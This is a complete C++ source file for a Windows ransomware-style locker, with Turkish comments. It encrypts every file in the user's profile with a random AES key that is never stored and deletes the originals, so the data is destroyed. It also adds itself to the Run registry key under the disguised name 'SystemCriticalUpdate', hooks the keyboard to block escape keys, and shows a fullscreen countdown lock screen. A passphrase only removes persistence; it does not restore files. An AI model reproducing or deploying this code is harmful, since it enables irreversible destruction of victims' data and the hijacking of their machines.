#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <thread>
#include <chrono>
#include <openssl/evp.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

// --- AYARLAR VE GLOBAL DEĞİŞKENLER ---
HHOOK hHook = NULL;
std::string inputBuffer = "";
// Senin verdiğin devasa kilit açma ve imha anahtarı:
const std::string SECRET_PASS = "[Y,1olI'l!E]j4ig3SNI6[QXSt$a!.r}P(V-5(Spc^I;_]XzgG";
const char* REG_NAME = "SystemCriticalUpdate";
int remainingSeconds = 86400; // 24 Saat (Canlı Sayaç)

// --- SİSTEM TEMİZLEME (İmha) ---
void KendiKendiniTemizle() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, REG_NAME);
        RegCloseKey(hKey);
    }
}

// --- KALICI HALE GETİRME (Startup) ---
void KendiKendiniBaslat() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, REG_NAME, 0, REG_SZ, (BYTE*)szPath, (DWORD)(strlen(szPath) + 1));
        RegCloseKey(hKey);
    }
}

// --- ŞİFRELEME MOTORU (OPENSSL) ---
void cifrar_archivo(const fs::path& ruta_entrada, const std::vector<unsigned char>& llave) {
    try {
        fs::path ruta_salida = ruta_entrada;
        ruta_salida += ".9213912938129381824712984";
        unsigned char iv[12]; RAND_bytes(iv, sizeof(iv));
        std::ifstream in(ruta_entrada, std::ios::binary);
        std::ofstream out(ruta_salida, std::ios::binary);
        if (!in || !out) return;
        out.write((char*)iv, 12);
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, llave.data(), iv);
        std::vector<char> buffer(4096);
        unsigned char ct[4096 + 16]; int len;
        while (in.read(buffer.data(), buffer.size()) || in.gcount() > 0) {
            EVP_EncryptUpdate(ctx, ct, &len, (unsigned char*)buffer.data(), (int)in.gcount());
            out.write((char*)ct, len);
        }
        EVP_EncryptFinal_ex(ctx, ct, &len); out.write((char*)ct, len);
        unsigned char tag[16]; EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
        out.write((char*)tag, 16);
        EVP_CIPHER_CTX_free(ctx); in.close(); out.close(); fs::remove(ruta_entrada);
    } catch (...) {}
}

void ArkaplanSifreleme() {
    char* up = getenv("USERPROFILE"); if (!up) return;
    std::vector<unsigned char> key(32); RAND_bytes(key.data(), 32);
    try {
        for (const auto& e : fs::recursive_directory_iterator(up)) {
            if (fs::is_regular_file(e.path()) && e.path().extension() != ".9213912938129381824712984")
                cifrar_archivo(e.path(), key);
        }
    } catch (...) {}
}

// --- KLAVYE ENGELLEME ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        char c = (char)MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR);
        if (c != 0) {
            inputBuffer += c;
            if (inputBuffer.length() > SECRET_PASS.length()) inputBuffer.erase(0, 1);
            if (inputBuffer == SECRET_PASS) { KendiKendiniTemizle(); PostQuitMessage(0); }
        }
        bool alt = (p->flags & LLKHF_ALTDOWN) || (GetAsyncKeyState(VK_MENU) & 0x8000);
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_ESCAPE || p->vkCode == VK_TAB || (alt && p->vkCode == VK_F4)) return 1;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// --- PENCERE YÖNETİMİ ---
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE:
        if (MessageBoxA(NULL, "UYARI: Bu yazilim dosyalari sifreler. Olusabilecek zararlardan sorumlu degiliz.\nDevam etmek icin onayliyor musunuz?", "Kritik Onay", MB_YESNO | MB_ICONWARNING) == IDNO) exit(0);
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
        KendiKendiniBaslat();
        std::thread(ArkaplanSifreleme).detach();
        SetTimer(hwnd, 1, 1000, NULL); // Saniye sayacı ve Bip
        break;

    case WM_TIMER:
        if (remainingSeconds > 0) remainingSeconds--;
        if (remainingSeconds % 5 == 0) Beep(1000, 100);
        InvalidateRect(hwnd, NULL, TRUE);
        break;

    case WM_PAINT: {
        PAINTSTRUCT ps; HDC hdc = BeginPaint(hwnd, &ps);
        RECT r; GetClientRect(hwnd, &r);
        HBRUSH hb = CreateSolidBrush(RGB(180, 0, 0)); FillRect(hdc, &r, hb); DeleteObject(hb);
        SetBkMode(hdc, TRANSPARENT); SetTextColor(hdc, RGB(255, 255, 255));

        // 1. Kilit Sembolü
        HFONT hfL = CreateFontW(180, 0, 0, 0, FW_BOLD, 0, 0, 0, 0, 0, 0, 0, 0, L"Segoe UI Symbol");
        SelectObject(hdc, hfL); RECT rl = r; rl.bottom -= 300;
        DrawTextW(hdc, L"\xD83D\xDD12", -1, &rl, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        DeleteObject(hfL);

        // 2. Başlık ve Sayaç
        HFONT hfT = CreateFontA(60, 0, 0, 0, FW_BOLD, 0, 0, 0, 0, 0, 0, 0, 0, "Impact");
        SelectObject(hdc, hfT); RECT rt = r; rt.top += 180;
        int h = remainingSeconds / 3600, m = (remainingSeconds % 3600) / 60, s = remainingSeconds % 60;
        std::string clock = "SYSTEM LOCKED\nTIME LEFT: " + std::to_string(h) + ":" + std::to_string(m) + ":" + std::to_string(s);
        DrawTextA(hdc, clock.c_str(), -1, &rt, DT_CENTER | DT_VCENTER);
        DeleteObject(hfT);

        // 3. Alt Bilgi
        HFONT hfS = CreateFontA(20, 0, 0, 0, FW_NORMAL, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas");
        SelectObject(hdc, hfS); RECT rs = r; rs.top = r.bottom - 180;
        std::string inf = "Zararlardan sorumlu degiliz. AES-256 Encryption Active.\nEnter your key to self-destruct.\nBy Mr.bay";
        DrawTextA(hdc, inf.c_str(), -1, &rs, DT_CENTER | DT_TOP);
        DeleteObject(hfS);

        EndPaint(hwnd, &ps);
        break;
    }
    case WM_DESTROY:
        if (hHook) UnhookWindowsHookEx(hHook);
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE, LPSTR, int n) {
    WNDCLASS wc = {}; wc.lpfnWndProc = WindowProc; wc.hInstance = h; wc.lpszClassName = "FinalUltraLock";
    wc.hCursor = LoadCursor(NULL, IDC_NO); RegisterClass(&wc);
    CreateWindowExA(WS_EX_TOPMOST, "FinalUltraLock", "Locked", WS_POPUP | WS_VISIBLE, 0, 0, 
        GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, h, NULL);
    MSG msg; while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    return 0;
}
